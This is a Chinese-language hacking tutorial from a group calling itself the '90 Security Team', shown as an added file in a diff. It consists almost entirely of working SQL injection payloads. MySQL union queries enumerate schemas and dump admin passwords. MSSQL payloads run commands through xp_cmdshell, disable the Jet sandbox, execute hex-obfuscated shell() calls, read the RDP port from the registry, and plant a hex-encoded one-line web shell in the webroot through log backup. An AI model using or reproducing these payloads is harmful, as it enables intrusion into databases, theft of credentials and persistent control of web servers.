@@ -1,0 +1,135 @@
+————————————————————————九零后安全技术小组 | 90 Security  Team -- 打造90后网安精英团队  ———————————————————————————————
+
+
+                                                             欢迎高手访问指导，欢迎新手朋友交流学习。
+
+                                                                  论坛： http://www.90team.net/
+
+
+
+教程内容:Mysql 5+php 注入
+
+
+
+一.查看MYSQL基本信息(库名,版本,用户)
+
+and 1=2 union select 1,2,3,CONCAT_WS(CHAR(32,58,32),user(),database(),version()),5,6,7,8/*
+
+二.查数据库
+
+and 1=2 union select 1,SCHEMA_NAME,3,4,5,6,7,8  from information_schema.SCHEMATA limit 1,1/*
+limit 从0开始递增，查询到3时浏览器返回错误，说明存在2个库。
+
+三.暴表
+
+and 1=2 union select 1,2,3,TABLE_NAME,5,6,7,8 from information_schema.TABLES where TABLE_SCHEMA =库的16进制编码 limit 1,1/*
+
+limit 从0开始递增，查询到14时浏览器返回错误，说明此库存在13个表。
+
+四.暴字段
+
+and 1=2 union select 1,2,3,COLUMN_NAME,4,5,6,7,8from information_schema.COLUMNS where TABLE_NAME=表的16进制编码 limit 1,1/*
+
+limit 从0开始递增，查询到时浏览器返回错误，说明此表存在N-1个列。
+
+五.暴数据
+
+and 1=2 union select 1,2,3,name,5,password,7,8 from web.ad_user/*
+
+
+这里直接暴明文的密码，大多时候我们遇到的是MD5加密之后的密文。
+
+
+                                                                                   新手不明白的可以到论坛发帖提问，我会的尽量给你解答。
+
+                                                                                              欢迎九零后的新手高手朋友加入我们
+
+                                                                                                     By 【90.S.T】书生
+                                                                                                     
+                                                                                                      MSN/QQ:it7@9.cn
+                                                                      
+                                                                                                    论坛：www.90team.net 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+IIS，404页面的默认路径是 C:\Windows\Help\iisHelp\common\404b.htm
+
+
+读取IIS配置信息获取web路径
+
+exec master..xp_cmdshell 'copy C:\Windows\system32\inetsrv\MetaBase.xml C:\Windows\Help\iisHelp\common\404b.htm'--
+
+执行命令exec master..xp_cmdshell 'ver >C:\Windows\Help\iisHelp\common\404b.htm'--
+
+
+CMD下读取终端端口
+regedit /e c:\\tsport.reg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"
+
+然后 type c:\\tsport.reg | find "PortNumber"
+
+
+
+
+
+
+;EXEC master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SoftWare\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',0;--
+
+;declare @s varchar(4000) set @s=cast(0x53656C656374202A2046726F6D204F70656E526F7753657428274D6963726F736F66742E4A65742E4F4C4544422E342E30272C20273B44617461626173653D6961735C6961732E6D6462272C202773656C656374207368656C6C2822636D642E657865202F63206563686F2057656C636F6D6520746F20392E302E732E74202020207777772E39307465616D2E6E65742020627920483478307872207869616F6A756E2020203E20433A5C57696E646F77735C48656C705C69697348656C705C636F6D6D6F6E5C343034622E68746D22292729 as varchar(4000));exec(@s);-- and 1=1 
+
+
+Select * From OpenRowSet('Microsoft.Jet.OLEDB.4.0', ';Database=ias\ias.mdb', 'select shell("cmd.exe /c echo Welcome to 9.0.s.t    www.90team.net  > C:\Windows\Help\iisHelp\common\404b.htm")')
+
+
+
+jsp一句话木马
+
+
+
+
+■基于日志差异备份
+--1. 进行初始备份
+; Alter Database TestDB Set Recovery Full Drop Table ttt Create Table ttt (a image) Backup Log TestDB to disk = '<e:\wwwroot\m.asp>' With Init--
+
+--2. 插入数据
+;Insert Into ttt Values(0x3C25DA696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C5C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293BDA253EDA)--
+
+--3. 备份并获得文件，删除临时表
+;Backup Log <数据库名> To Disk = '<e:\wwwroot\m.asp>';Drop Table ttt Alter Database TestDB Set Recovery SIMPLE--
+
+
+
